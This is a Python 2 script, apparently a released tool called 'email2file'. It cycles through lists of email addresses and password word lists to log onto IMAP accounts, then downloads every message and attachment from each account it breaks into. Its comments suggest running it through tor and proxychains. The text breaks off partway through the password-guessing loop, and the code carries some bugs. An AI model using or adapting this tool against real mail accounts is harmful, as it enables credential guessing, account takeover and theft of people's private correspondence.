#!/usr/bin/env python
#
##### EMAIL2FILE v1.787 BETA
##### AUTHOR: vvn < lost @ nobody . ninja >
##### VERSION RELEASE: July 8, 2015
#####
##### SAVE EMAIL LISTS AS PLAIN TEXT format in script directory with one address per line.
##### you can include the password, if known, as a base64-encoded string 
##### separated by a comma. just use "email@addy.com, encoded_password"
##### on each line instead.
#####
##### if there are only a few email addresses, you can easily generate the file:
##### open a terminal or MS-DOS window to the script directory, then enter:
##### echo "your@email.com" >> emails.txt
##### repeat entering the above command for each email you want to use.
##### when prompted to enter the email list file name, enter "emails.txt".
#####
##### PASSWORD LISTS SHOULD BE ONLY ONE WORD PER LINE.
##### they can also be base64-encoded or encrypted. you can either run
##### "python encodelist.py" to b64-encode or "python encryptlist.py" to
##### encrypt the list, or select the option to encode or encrypt the list
##### while running this script (email2file.py).
##### 
##### ENCRYPTION NOW FULLY WORKING FOR PASSWORD LISTS!
##### the feature has now been fully integrated in the main script!
##### use the encrypt feature to safely store your password lists,
##### and decrypt them for use with the script. it is highly recommended
##### that you delete the plaintext files after script completes.
#####
##### TO RUN SCRIPT: open terminal to script directory and enter:
##### "python email2file.py"
##### PLEASE USE PYTHON 2.7.X AND NOT PYTHON 3 OR YOU WILL GET SYNTAX ERRORS!
#####
##### works best on OSX and linux systems, but you can try it on windows.
##### i even went to the trouble of trying to remove ANSI color codes for you
##### windows users, so you'd better use it! if you are on windows, you can
##### install the colorama or ansiterm python module to support ANSI colors.
##### if you have setuptools or pip installed, you can easily get it by 
##### opening a MS-DOS window as administrator and typing the following:
##### "pip install colorama" or "pip install ansiterm"
##### you can get pip by entering: "easy_install pip"
##### depending on the text encoding of the original email, each message
##### is saved as a TXT or HTM file. the files can be found in the
##### respective account subfolder within the 'email-output' directory
##### in your user HOME directory or the configured $HOME env path.
##### for example, a message from sender@email.com with subject "test"
##### in rich text format received at user@email.com will output to:
##### ~/email-output/user_email.com/01-"sender" <sender@email.com> .htm
##### where ~ is your $HOME or %USERPROFILE% directory path.
#####
##### a file of all mail headers is also saved in the 'email-output' directory.
##### it should be called user@email.com-headerlist-yyyy-mm-dd.txt
#####
##### attachments are saved either in account folder or 'attachments' subfolder.
#####
##### ****KNOWN BUGS:****
##### socket.error "[Errno 54] Connection reset by peer"
##### will interrupt the script execution. in case that it happens,
##### just start the script again:
##### python email2file.py or chmod +x *.py && ./email2file.py
##### if you run tor and proxychains, you can run the script within proxychains:
##### proxychains python email2file.py
#####
##### latest release should be found on github:
##### http://github.com/eudemonics/email2file
##### git clone https://github.com/eudemonics/email2file.git email2file
##################################################
##################################################
##### USER LICENSE AGREEMENT & DISCLAIMER
##### copyright, copyleft (C) 2014-2015  vvn < lost @ nobody . ninja >
#####
##### This program is FREE software: you can use it, redistribute it and/or modify
##### it as you wish. Copying and distribution of this file, with or without modification,
##### are permitted in any medium without royalty provided the copyright
##### notice and this notice are preserved. This program is offered AS-IS,
##### WITHOUT ANY WARRANTY; without even the implied warranty of
##### MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
##### GNU General Public License for more details.
##################################################
##################################################
##### getting credited for my work is nice. so are donations.
##### BTC: 1M511j1CHR8x7RYgakNdw1iF3ike2KehXh
##### https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=26PWMPCNKN28L
##### but to really show your appreciation, you should buy my EP instead!
##### you can stream and purchase it at: dreamcorp.bandcamp.com
##### (you might even enjoy listening to it)
##### questions, comments, feedback, bugs, complaints, death threats, marriage proposals?
##### contact me at: lost @ nobody [dot] ninja
##### there be only about a thousand lines of code after this -->

from __future__ import print_function
import email, base64, getpass, imaplib, threading
from email.header import decode_header
import re, sys, os, os.path, socket, time, traceback, logging
from datetime import datetime, date
from threading import Thread, Timer
from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Util import Counter
from ansilist import ac

colorintro = '''
\033[34m=====================================\033[33m
---------\033[36m EMAIL2FILE v1.787 \033[33m---------
-------------------------------------
-----------\033[35m author : vvn \033[33m------------
---------\033[32m lost@nobody.ninja \033[33m---------
\033[34m=====================================\033[33m
----\033[37m support my work: buy my EP! \033[33m----
---\033[37m http://dreamcorp.bandcamp.com \033[33m---
---\033[37m facebook.com/dreamcorporation \033[33m---
------\033[32m thanks for the support! \033[33m------
\033[34m=====================================\n\033[0m
'''

cleanintro = '''
=====================================
--------- EMAIL2FILE v1.787 ---------
-------------------------------------
----------- author : vvn ------------
--------- lost@nobody.ninja ---------
=====================================
---- support my work: buy my EP! ----
--- http://dreamcorp.bandcamp.com ---
--- facebook.com/dreamcorporation ---
------ thanks for the support! ------
=====================================
'''

global usecolor

if not os.path.exists('logs'):
   os.makedirs('logs', 0755)

ustimefmt = lambda a: date.strftime(a,"%m/%d/%Y %I:%M%p")
today = datetime.now()
today = date.strftime(today,"%m-%d-%Y[%H:%M]")
logfile = 'email2file-' + today + '.log'
logfile = os.path.join('logs', logfile)

logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s %(levelname)-8s %(message)s',
                    datefmt='%a, %d %b %Y %I:%M%p',
                    filename=logfile,
                    filemode='w')

if os.name == 'nt' or sys.platform == 'win32':
   os.system('icacls encryptlist.py /grant %USERNAME%:F')
   os.system('icacls encodelist.py /grant %USERNAME%:F')
   try:
      import colorama
      colorama.init()
      usecolor = "color"
      progintro = colorintro
   except:
      try:
         import tendo.ansiterm
         usecolor = "color"
         progintro = colorintro
      except:
         usecolor = "clean"
         progintro = cleanintro
         pass
else:
   usecolor = "color"
   progintro = colorintro

print(progintro)

time.sleep(0.9)

# CHECK IF SINGLE EMAIL (1) OR LIST OF MULTIPLE EMAIL ADDRESSES IS USED (2)
print('''\033[34;1mSINGLE EMAIL ADDRESS OR LIST OF MULTIPLE EMAIL ADDRESSES?\033[0m
list of multiple email addresses must be in text format
with one email address per line. PASSWORD LIST with one
password per line in plain text or base64 encoded format
supported. ENCRYPTION MODULE also now fully supported! To
encrypt password list, run \033[36;1mpython encryptlist.py\033[0m.
***ALSO SUPPORTS EMAIL AND PASSWORD IN A SINGLE FILE:***
one email address + one password (plaintext or base64 encoded)
per line separated by a comma (example@domain.com, password)
''')
qtyemail = raw_input('enter 1 for single email or 2 for multiple emails --> ')

while not re.search(r'^[12]$', qtyemail):
   qtyemail = raw_input('invalid entry. enter 1 for a single email address, or enter 2 to specify a list of multiple email addresses in text format --> ')

usewordlist = raw_input('do you want to use a word list rather than supply a password? enter Y/N --> ')

while not re.search(r'^[nyNY]$', usewordlist):
   usewordlist = raw_input('invalid entry. enter Y to use word list or N to supply password --> ')

usesslcheck = raw_input('use SSL? Y/N --> ')

while not re.search(r'^[nyNY]$', usesslcheck):
   usesslcheck = raw_input('invalid selection. please enter Y for SSL or N for unencrypted connection. -->')

sslcon = 'yes'

if usesslcheck.lower() == 'n':
   sslcon = 'no'

else:
   sslcon = 'yes'
   
# FUNCTION TO RESOLVE IMAP SERVER
def resolveimap(imap_server):
   server_ip = imap_server
   resolved_ips = []

   try:
      nscheck = socket.getaddrinfo(imap_server,0,0,0,0)
      for result in nscheck:
         resolved_ips = list(set(result))

   except socket.error as e:
      pass
      logging.warning('unable to resolve %s' % imap_server)
      logging.warning('caught exception: %s' % str(e))
      if usecolor == 'color':
         print(ac.OKAQUA + 'could not resolve ' + ac.OKPINK + imap_server + ac.CLEAR)
      else:
         print('could not resolve %s' % imap_server)
      
      print('\nerror: %s \n' % str(e))
      imap_server = raw_input('please enter a valid IMAP server --> ')
      while not re.search(r'^[_a-zA-Z0-9-]+(\.[_a-zA-Z0-9-]+)*(\.[a-zA-Z]{2,15})$', imap_server):
         imap_server = raw_input('invalid hostname. please enter a valid IMAP server --> ')
      nscheck = socket.getaddrinfo(imap_server,0)
      for result in nscheck:
         resolved_ips = list(set(result))
      #print(resolved_ips)
   
   finally:
      logging.info('raw response for getaddrinfo: %s' % str(resolved_ips))
      if len(str(resolved_ips[3])) > 1:
         server_ip = resolved_ips[3][0]
      else:
         server_ip = resolved_ips[4][0]
      print('resolved to: %s \n' % str(server_ip))
   
   return imap_server

# FUNCTION TO CHECK LOGIN CREDENTIALS
def checklogin(emailaddr, emailpass, imap_server, sslcon):

   global checkresp
   efmatch = re.search(r'^[_a-zA-Z0-9-]+(\.[_a-zA-Z0-9-]+)*@[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*(\.[a-zA-Z]{2,9})$', emailaddr)
   while not efmatch:
      emailaddr = raw_input('invalid email format. enter a valid email address --> ')
   
   imap_port = 993

   if 'no' in sslcon:
      imap_port = 143

      if 'gmail.com' in emaildomain:
         imap_port = 587

   if 'yes' in sslcon:
      server = imaplib.IMAP4_SSL(imap_server, imap_port)

   else:
      server = imaplib.IMAP4(imap_server, imap_port)

   checkresp = 'preconnect'
   if usecolor == 'color':
      print('\nattempting to log onto: ' + ac.GREEN + emailaddr + ac.CLEAR)
   else:
      print('\nattempting to log onto: %s' % emailaddr)
   print('\n')
   
   logging.info('attempting to connect to IMAP server to check login credentials for account %s' % emailaddr)

   try:

      loginstatus, logindata = server.login(emailaddr, emailpass)

      if 'OK' in loginstatus:
         if usecolor == 'color':
            print(ac.BEIGEBOLD + 'LOGIN SUCCESSFUL: ' + ac.PINKBOLD + emailaddr + ac.CLEAR)
         else:
            print('LOGIN SUCCESSFUL: %s' % emailaddr)
         logging.info('INFO: LOGIN successful for account %s' % emailaddr)
         checkresp = 'OK'

      elif 'AUTHENTICATIONFAILED' in loginstatus:
         loginmsg = 'LOGIN FAILED: %s with %s' % (loginstatus, logindata)
         print(loginmsg)
         logging.warning('ERROR: %s for account %s') % (loginmsg, emailaddr)
         checkresp = 'AUTHENFAIL'

      elif 'PRIVACYREQUIRED' in loginstatus:
         loginmsg = 'LOGIN FAILED: %s with %s' % (loginstatus, logindata)
         print(loginmsg)
         logging.warning('ERROR: %s for account %s') % (loginmsg, emailaddr)
         checkresp = 'PRIVACYREQ'

      elif 'UNAVAILABLE' in loginstatus:
         loginmsg = 'LOGIN FAILED: %s with %s' % (loginstatus, logindata)
         print(loginmsg)
         logging.warning('ERROR: %s for account %s') % (loginmsg, emailaddr)
         checkresp = 'UNAVAIL'

      elif 'AUTHORIZATIONFAILED' in loginstatus:
         loginmsg = 'LOGIN FAILED: %s with %s' % (loginstatus, logindata)
         print(loginmsg)
         logging.warning('ERROR: %s for account %s') % (loginmsg, emailaddr)
         checkresp = 'AUTHORFAIL'

      elif 'EXPIRED' in loginstatus:
         loginmsg = 'LOGIN FAILED: %s with %s' % (loginstatus, logindata)
         print(loginmsg)
         logging.warning('ERROR: %s for account %s') % (loginmsg, emailaddr)
         checkresp = 'EXPIRED'

      elif 'CONTACTADMIN' in loginstatus:
         loginmsg = 'LOGIN FAILED: %s' % loginstatus
         print(loginmsg)
         logging.warning('%s for account %s') % (loginmsg, emailaddr)
         checkresp = 'ADMINREQ'

      else:
         print('Unable to connect: %s' % emailaddr)
         logging.error('%s for account %s') % (loginstatus, emailaddr)
         checkresp = 'UNKNOWN'
         
   except IOError as e:
      pass
      logging.error('IO ERROR: %s for account %s') % (str(e), emailaddr)
      checkresp = 'IOERROR'
   
   except socket.error as e:
      pass
      logging.error('SOCKET ERROR: %s for account %s') % (str(e), emailaddr)
      checkresp = 'SOCKETERROR'

   except server.error as e:
      pass
      logging.error('IMAPLIB ERROR: ' + str(e) + ' for account ' + emailaddr)
      checkresp = 'IMAPERROR'

      if 'BAD' in str(e):
         checkresp = 'BAD'
      else:
         checkresp = 'ERROR'

   except socket.timeout as e:
      pass
      print('Socket timeout: %s' % str(e))
      logging.error(str(e) + ' - Socket timeout while logging onto account ' + str(emailaddr))
      checkresp = 'TIMEOUT'

   except:
      pass
      checkimap = raw_input('error logging onto ' + imap_server + '. to use a different IMAP server, enter it here. else, press ENTER to continue --> ')
      logging.warning('WARNING: unknown error occurred while trying to log onto account %s' % emailaddr)
      if len(checkimap) > 0:
         while not re.search(r'^[_a-zA-Z0-9-]+(\.[_a-zA-Z0-9-]+)*(\.[a-zA-Z0-9-]+)*(\.[a-zA-Z]{2,9})$', checkimap):
            checkimap = raw_input('invalid format. please enter a valid IMAP server --> ')
         imap_server = checkimap
      checkresp = 'OTHERERROR'
      checklogin(emailaddr, emailpass, imap_server, sslcon)
      
   return checkresp
# END OF FUNCTION checklogin()

# FUNCTION TO CHECK FOR EMAIL FORMAT ERRORS BEFORE SUBMITTING TO SERVER
def checkformat(emailaddr):

   # START WHILE LOOP TO CHECK EMAIL FORMAT FOR ERRORS BEFORE ATTEMPTING LOGIN
   match = re.search(r'^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,9})$', emailaddr)
   while not match:
      emailformat = 'bad'
      if usecolor == 'color':
         print('\033[31m invalid email format \033[0m\n')
      else:
         print('invalid email format')
      emailaddr = raw_input('please enter email again --> ')
      emailpass = getpass.getpass('please enter password --> ')

   emailformat = 'good'
   return emailformat
# END OF FUNCTION checkformat()

# FUNCTION TO DECODE EMAIL BODY AND ATTACHMENTS
def decode_email(msgbody):

   msg = email.message_from_string(msgbody)

   if msg is None:
      decoded = msg

   decoded = msg
   text = ""
   att = False

   if msg.is_multipart():
      html = None

      for part in msg.get_payload():

         print("\033[31m%s, %s\033[0m" % (part.get_content_type(), part.get_content_charset()))

         if part.get_content_charset() is None:
            text = part.get_payload(decode=True)
            continue

         charset = part.get_content_charset()

         if part.get_content_type() == 'text/plain':
            text = unicode(part.get_payload(decode=True), str(charset), "ignore").encode('utf8', 'replace')
            enc = part['Content-Transfer-Encoding']
            if enc == "base64":
               text = part.get_payload()
               text = base64.decodestring(text)

         if part.get_content_type() == 'text/html':
            html = unicode(part.get_payload(decode=True), str(charset), "ignore").encode('utf8', 'replace')

         if part.get_content_maintype() == 'multipart':
            continue

         elif part.get('Content-Disposition') is None:
            continue

         elif part.get_content_type() == "multipart/alternative":
            text = part.get_payload(decode=True)
            enc = part['Content-Transfer-Encoding']
            if part.get_content_type() == "text/plain":
                text = part.get_payload()
                if enc == "base64":
                    text = base64.decodestring(text)

         filename = part.get_filename()

         if bool(filename):

            homedir = os.path.expanduser("~")

            rootdir = os.path.join(homedir, 'email-output')

            if not os.path.exists(rootdir):
               os.makedirs(rootdir, 0755)

            atdomain = re.search("@.*", emailaddr).group()
            emaildomain = atdomain[1:]
            i = len(emailaddr) - len(atdomain)
            user_savename = emailaddr[:i]
            # user_savename = emailaddr.rstrip(atdomain)
            subdir = user_savename+"_"+emaildomain

            detach_dir = os.path.join(rootdir, subdir)

            if not os.path.exists(detach_dir):
               os.makedirs(detach_dir, 0755)

            att_path = os.path.join(detach_dir, 'attachments', filename)

            if 'attachments' not in os.listdir(detach_dir):
               os.makedirs(detach_dir + '/attachments', 0755)

            att = True

            if not os.path.isfile(att_path):
               attfile = open(att_path, 'wb+')
               attfile.write(part.get_payload(decode=True))
               attfile.close()
               decoded = attfile

      if att is False:
         decoded = msg

         if html is None and text is not None:
            decoded = text.strip()

         elif html is None and text is None:
            decoded = msg

         else:
            decoded = html.strip()

   else:
      decoded = msg

   return decoded
# END OF FUNCTION decode_email()

# FUNCTION TO LOG ONTO IMAP SERVER AND GET EMAIL
def getimap(emailaddr, emailpass, imap_server, sslcon):

   imap_port = 993
   server = imaplib.IMAP4_SSL(imap_server, imap_port)

   if 'no' in sslcon:
      imap_port = 143
      server = imaplib.IMAP4(imap_server, imap_port)

   if 'gmail.com' in emailaddr and 'no' in sslcon:
      imap_port = 587

   attempts = 20

   while True and attempts > 0:

      try:

         loginstatus, logindata = server.login(emailaddr, emailpass)

         if loginstatus == 'OK':

            select_info = server.select('INBOX')
            status, unseen = server.search(None, 'UNSEEN')
            typ, listdata = server.list()
            countunseen = len(unseen)

            if usecolor == 'color':

               print("\n\033[35m%d UNREAD MESSAGES\033[0m" % len(unseen))
               print()
               print('Response code: \n\033[32m', typ)
               print('\033[0m\nFOLDERS:\n\033[33m')
               for l in listdata:
                  print(str(l), '\n')
               print('\033[34m\nlogin successful, fetching emails.. \033[0m\n')

            else:

               print("%d UNREAD MESSAGES" % len(unseen))
               print()
               print('Response code: \n', typ)
               print('\nFOLDERS:\n')
               for l in listdata:
                  print(str(l), '\n')
               print('\nlogin successful, fetching emails.. \n')

            logging.info('LOGIN successful for %s.' % emailaddr)
            logging.info('%d unread messages in INBOX.' % countunseen)
            logging.info('fetching all messages...')

            # server.list()

            server.select()

            result, msgs = server.search(None, 'ALL')

            ids = msgs[0]
            id_list = ids.split()
            latest_id = int(id_list[-1])
            first_id = int(id_list[0])
            logging.info(str(latest_id) + ' total messages for ' + str(emailaddr))

            if usecolor == 'color':

               print(ac.OKGREEN + "TOTAL MESSAGES: " + ac.OKPINK + str(latest_id) + ac.CLEAR + "\n")
               print('\033[37m------------------------------------------------------------\n\033[0m')

            else:
            
               print("TOTAL MESSAGES: " + str(latest_id))

               print('------------------------------------------------------------')


            #homedir = os.path.expanduser("~")

            #rootdir = os.path.join(homedir, 'email-output')
            
            rootdir = 'email-output'
            
            if not os.path.exists(rootdir):
               os.makedirs(rootdir, 0755)

            printdate = str(date.today())

            prev_file_name = emailaddr+"-headerlist-"+printdate+".txt"
            prev_complete_name = os.path.join(rootdir, prev_file_name)

            for email_uid in reversed(id_list):
               
               result, rawdata = server.fetch(email_uid, '(RFC822)')

               rawbody = rawdata[0][1].strip()

               m = email.message_from_string(rawbody)

               msgfrom = m['From'].replace('/', '-')
               msgfrom = msgfrom.replace('<', ' ')
               msgfrom = msgfrom.replace('>', '')
               msgsubject = m['Subject'].replace('/', '-')
               decodedsubject = decode_header(msgsubject)[0]
               decodedfrom = decode_header(msgfrom)[0]
               if (decodedsubject[1] != None):
                  msgsubject = unicode(msgsubject, decodedsubject[1])
               msgsubject = msgsubject.encode('utf-8')
               msgsubject = msgsubject[:35].strip()
               if (decodedfrom[1] != None):
                  msgfrom = unicode(msgfrom, decodedfrom[1])
               msgfrom = msgfrom.encode('utf-8')
               msgfrom = msgfrom[:25].strip()
               
               body = decode_email(rawbody)

               atdomain = re.search("@.*", emailaddr).group()
               emaildomain = atdomain[1:]
               j = len(emailaddr) - len(atdomain)
               user_save = emailaddr[:j]

               subdir =  user_save + "_" + emaildomain
               save_path = os.path.join(rootdir, subdir)

               if not os.path.exists(save_path):
                  os.makedirs(save_path)

               mbody = email.message_from_string(rawbody)

               if mbody.is_multipart():

                  ext = ".txt"

                  for mpart in mbody.get_payload():

                     if 'text' in mpart.get_content_type():
                        ext = ".txt"
                        isattach = False

                        if mpart.get_content_type() == 'text/html':
                           ext = ".htm"
                           isattach = False

                     else:
                        file_name = mpart.get_filename()
                        isattach = True

               else:
                  isattach = False
                  ext = ".txt"

               if isattach is False:
                  file_name = email_uid + "-" + msgfrom[:25] + "-" +  msgsubject[:35] + ext

               if file_name is None:
                  file_name = email_uid + "-" + msgfrom[:25] + "-" + msgsubject[:35] + ext

               complete_name = os.path.join(save_path, file_name)

               dtnow = datetime.now()
               dtdatetime = str(date.strftime(dtnow,"%m-%d-%Y %I:%M%p"))
               dtdate = str(date.strftime(dtnow,"%m-%d-%Y"))
               dttime = str(dtnow.hour) + ":" + str   (dtnow.minute)

               if os.path.isfile(complete_name):

                  print('\n\033[33m' + complete_name + '\033[0m already exists, skipping.. \n')

               else:

                  if type(body) is str or type(body) is buffer and isattach is True:
                     print('\n\033[34mdownloading file: \033[33m' + str(file_name) + '\033[0m\n')
                     bodyfile = open(complete_name, 'wb+')
                     # bodyfile.seek(0)
                     bodyfile.write(body)
                     bodyfile.close()

                  else:
                     bodyfile = open(complete_name, 'wb+')
                     bodyfile.write("SENDER: \n")
                     bodyfile.write(msgfrom)
                     bodyfile.write('\n')
                     # bodyfile.write('Decoded:\n')
                     bodyfile.write(str(body))
                     bodyfile.write('\nRAW MESSAGE DATA:\n')
                     bodyfile.write(rawbody)
                     bodyfile.write('\n')
                     bodyfile.write('saved on: ' + dtdate + ', ' + dttime)
                     bodyfile.write('\n')
                     bodyfile.close()

                  if usecolor == 'color':

                     print('\033[36m\033[1mmessage data saved to new file: \033[35m' + complete_name + '\033[0m\n')

                  else:

                     print('message data saved to new file: ' + complete_name)

               if usecolor == 'color':

                  print('\033[37m------------------------------------------------------------\033[0m\n')

                  resp, data = server.fetch(email_uid, '(UID FLAGS BODY.PEEK[HEADER.FIELDS (FROM SUBJECT DATE)])')
                  print('\033[35m' + email_uid + '\033[0m\n')

               else:

                  print('------------------------------------------------------------\n')

                  resp, data = server.fetch(email_uid, '(UID FLAGS BODY.PEEK[HEADER.FIELDS (FROM SUBJECT DATE)])')
                  print(email_uid)

               print(data[0][1] + '\n')
               msgpreview = data[0][1]


               prevfile = open(prev_complete_name, 'wb+')
               #   prevfile.write('Email headers for: ' + emailaddr + '\n')
               prevfile.write(email_uid)
               prevfile.write("\n")
               prevfile.write(msgpreview)
               prevfile.write("\n")
               #prevfile.close()

            if usecolor == 'color':

               print('\033[32minbox contents successfully saved to file. YAY! \033[0m\n')

            else:

               print('inbox contents successfully saved to file. YAY!')
            
            logging.info('inbox contents for %s written to file.' % str(emailaddr))

         if usecolor == 'color':

            print('list of message previews saved as: \033[31m' + prev_complete_name + '\033[0m \n')

         else:

            print('list of message previews saved as: ', prev_complete_name)
         
         logging.info('message previews saved to file as %s' % str(prev_complete_name))

         print('logging out..\n')

         server.logout()
         logging.info('logged out from %s' % emailaddr)

         print('logout successful.\n')
         # EXIT LOOP IF SUCCESSFULLY AUTHENTICATED
         attempts = -1
         break
      
      except server.abort as e:
         pass
         logging.error('IMAPLIB server abort: %s' % str(e))
         checkresp = 'ABORT'

         if usecolor == 'color':
            print('\033[32mconnection to IMAP server aborted.\033[0m\n')
            print('\033[36mIMAPLIB ERROR: \033[33m' + str(e) + '\033[0m\n')

         else:

            print('connection to IMAP server aborted.\n')
            print('IMAPLIB ERROR: ' + str(e) + '\n')
            
         attempts =- 1
         getimap(emailaddr, emailpass, imap_server, sslcon)
         break
         
      except server.error as e:
         pass
         logging.error('IMAPLIB ERROR: %s' % str(e))
         checkresp = 'ERROR'

         if usecolor == 'color':
            print('\033[32mconnection failed to IMAP server.\033[0m\n')
            print('\033[36mIMAPLIB ERROR: \033[33m' + str(e) + '\033[0m\n')

         else:

            print('connection failed to IMAP server.\n')
            print('IMAPLIB ERROR: ' + str(e) + '\n')
            
         attempts =- 1
         atdomain = re.search("@.*", emailaddr).group()
         emaildomain = atdomain[1:]
   
         getimap(emailaddr, emailpass, imap_server, sslcon)
         break
            
   if attempts is 0:
      print('too many logon failures. unable to log onto IMAP server. quitting..')
      sys.exit(1)
# END OF FUNCTION getimap(emailaddr, emailpass, imap_server, sslcon)

# MULTIPLE EMAIL ADDRESSES
if qtyemail == '2':
   emaillistfile = raw_input('please copy the email list file to the script directory, then enter filename --> ')
   while not os.path.isfile(emaillistfile):
      emaillistfile = raw_input('the file path specified does not exist or is not accessible. please check the file and enter again --> ')
      logging.warning('email list file not found: %s' % str(emaillistfile))

   logging.info('using email list file %s' % str(emaillistfile))
   ef = open(emaillistfile, "r")
   emailfile = ef.readlines()
   eflen = len(emailfile)

   # USING PASSWORD LIST
   if usewordlist.lower() == 'y':
      pwlistfile = raw_input('please make sure password list is in the script directory, then enter the filename --> ')
      while not os.path.isfile(pwlistfile):
         pwlistfile = raw_input('the path to the word list file you entered is not valid. please check the file and enter again --> ')
         logging.warning('invalid path for word list file: %s' % str(pwlistfile))

      encryptsel = raw_input('is the word list encrypted using encryptlist.py? Y/N --> ')      
      while not re.search(r'^[nNyY]$', encryptsel):
         encryptsel = raw_input('invalid selection. enter Y if word list was encrypted using encryptlist.py or N if not encrypted --> ')
      
      # IF PASSWORD LIST IS ENCRYPTED  
      if encryptsel.lower() == 'y':
      
         if os.path.isfile('secret.key'):
            if usecolor == 'color':
               keycheck = raw_input('base64-encoded key generated by encryptlist.py found at ' + ac.GREEN + 'secret.key' + ac.CLEAR + '. \nis the password list encrypted using this key? enter Y/N --> ')
            else:
               keycheck = raw_input('base64-encoded key generated by encryptlist.py found at secret.key. \nis the password list encrypted using this key? Y/N --> ')
            while not re.match(r'^[nNyY]$', keycheck):
               keycheck = raw_input('invalid selection. enter Y to use secret.key or N to enter another key file --> ')
            secretkey = 'secret.key'
            if keycheck.lower() == 'n':
               secretkey = raw_input('please enter filename for the key used to encrypt your password list --> ')
               while not os.path.isfile(secretkey):
                  secretkey = raw_input('file not found. please check the filename and enter again --> ')
            logging.info('using encryption key file %s to decrypt word list.' % str(secretkey))
            encpass = getpass.getpass('please enter the secret passphrase used to generate the encrypted file --> ')
            AES_Dec = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip('&')
            cryptfile = open(secretkey, 'r')
            a = cryptfile.readline()
            cryptkey = base64.b64decode(a)
            cryptfile.close()

            secretpadlen = 16 - (len(encpass) % 16)
            secret = encpass + ('&' * secretpadlen)
            cipher = AES.new(cryptkey, AES.MODE_CBC, secret)
            print('\nusing encryption key: ')
            if usecolor == 'color':
               print(ac.PINKBOLD + a + ac.CLEAR)
            else:
               print(a)
            print('')
      
      # IF PASSWORD LIST NOT ENCRYPTED
      else:
      
         b64sel = raw_input('is the word list base64-encoded using encodelist.py? Y/N --> ')
         while not re.search(r'^[nNyY]$', b64sel):
            b64sel = raw_input('invalid selection. enter Y if word list is base64-encoded or N if plain text --> ')

         if b64sel.lower() == 'n':         
            gotoencsel = raw_input('storing passwords in plaintext is a security risk. \nenter 1 to encrypt the contents of your password list. \nenter 2 to use base64 encoding. enter 3 to continue with a plaintext password list. --> ')
            while not re.search(r'^[1-3]$', gotoencsel):
               gotoencsel = raw_input('invalid selection. enter 1 to run script to encrypt your password list. \nenter 2 to base64-encode it. or enter 3 to continue with plaintext list --> ')
            if gotoencsel == '1':
               print("launching encryptlist.py..")
               logging.info('launched encryptlist.py')
               os.system('chmod +x encryptlist.py')
               os.system('python encryptlist.py')
            elif gotoencsel == '2':
               print("launching encodelist.py..")
               logging.info('launched encodelist.py')
               os.system('chmod +x encodelist.py')
               os.system('python encodelist.py')
            else:
               logging.warning('password list stored in plain text is a security risk.')
               print('*** to encrypt your list in the future, run \'python encryptlist.py\'. to  base64-encode your list in the future, run \'python encodelist.py\' ***')
         else:
            logging.info('using base64 decoding for password list.')
               
      print("\nusing word list: ")
      if usecolor == 'color':
         print(ac.YELLOWBOLD + pwlistfile + ac.CLEAR)
      else:
         print(pwlistfile)
      print('')
      logging.info('using word list file: %s' % str(pwlistfile))

      lnemail = ''
      lnpass = ''
 
      if usecolor == 'color':
         print("\n\033[31mEMAIL ADDRESSES IN FILE:\033[0m %s \n" % str(eflen))
      else:
         print("EMAIL ADDRESSES IN FILE: %s \n" % str(eflen))

      logging.info('found %s email addresses in email list file ' % str(eflen))
      efcount = 1
      lenfile = len(emailfile)
      countdown = lenfile
      
      for index,line in enumerate(emailfile):
      
         emindex = index + 1
         
         countdown -= 1
         
         empercent = float(emindex) / float(lenfile)
         empercent2 = empercent - .05
         pr2 = int(empercent2 * 100)
         pr = int(empercent * 100)
         
         progress = lambda a: str(a) + "%"
         
         if usecolor == 'color':
            print("PROGRESS:\033[36;1m %s \033[0m" % str(emindex))
            print("TOTAL EMAIL ADDRESSES:\033[36;1m %s \033[0m\n" % str(lenfile))
            print("PERCENT COMPLETE:\033[36;1m %s \033[0m\n" % progress(pr2))
         
         else:
            print("PROGRESS: %s" % str(emindex))
            print("TOTAL EMAIL ADDRESSES: %s \n" % str(lenfile))
            print("PERCENT COMPLETE: %s \n" % progress(pr2))
         
         logging.info('tried ' + str(emindex) + ' entries out of ' + str(lenfile))
         
         # WITH EMAIL AND PASSWORD IN SAME FILE
         if re.search(r'^[\,]$', line):

            line = line.strip()
            linevals = line.split(",")

            lnemail = linevals[0]
            lnemail = str(lnemail.strip())
            lnpass = linevals[1]
            
            if b64sel.lower() == 'y':
               lnpass = base64.b64decode(lnpass)

            lnpass = lnpass.strip()
            lnpass = lnpass.replace("\n","")
            lnpass = str(lnpass)

            if usecolor == 'color':
               print('\033[32mUSING EMAIL ADDRESS: \033[34;1m' + lnemail + ac.CLEAR)
            
            else:
               print('USING EMAIL ADDRESS: ' + lnemail)
            
            logging.info('attempting to log onto %s' % lnemail)
            atdomain = re.search("@.*", lnemail).group()
            emaildomain = atdomain[1:]

            imap_server = 'imap.' + emaildomain
            imap_port = 993
            
            resolved = resolveimap(imap_server)
            
            if len(resolved) < 1:
               resolved = resolveimap(imap_server)
            
            imap_server = resolved

            logging.info('trying server %s on port %s' % imap_server, imap_port)
            loginok = checklogin(lnemail, lnpass, imap_server, sslcon)

            if 'OK' not in loginok:
               print('login failure. skipping to next entry in list...')
               logging.warning('LOGIN to %s failed' % emailaddr)
               continue
               
            else:
               logging.info('LOGIN to %s successful' % emailaddr)
               getimap(lnemail, lnpass, imap_server, sslcon)
         
         # EMAIL AND PASSWORD IN SEPARATE FILES
         else:
            
            lnemail = line.strip()
            lnemail = lnemail.replace("\n","")
            atdomain = re.search("@.*", lnemail).group()
            emaildomain = atdomain[1:]

            imap_server = 'imap.' + emaildomain
            imap_port = 993
            
            resolved = resolveimap(imap_server)
            
            if len(resolved) < 1:
               resolved = resolveimap(imap_server)
            
            imap_server = resolved
         
            if usecolor == 'color':
                     print('\n\033[34m------------------------------------------------------------\033[0m\n')
                     print('\n\033[32mUSING EMAIL ADDRESS: \033[34;1m' + line + ac.CLEAR)
                     print('\n\033[34m------------------------------------------------------------\033[0m\n')
            
            else:
               print('\n------------------------------------------------------------\n')
               print('\nusing email address: ' + line)
               print('\n------------------------------------------------------------\n')
            
            pf = open(pwlistfile, "r+")
            wordlist = pf.readlines()
            listlen = len(wordlist)

            tries = 0
            lnemail = str(lnemail)

            for lnpass in wordlist:
            
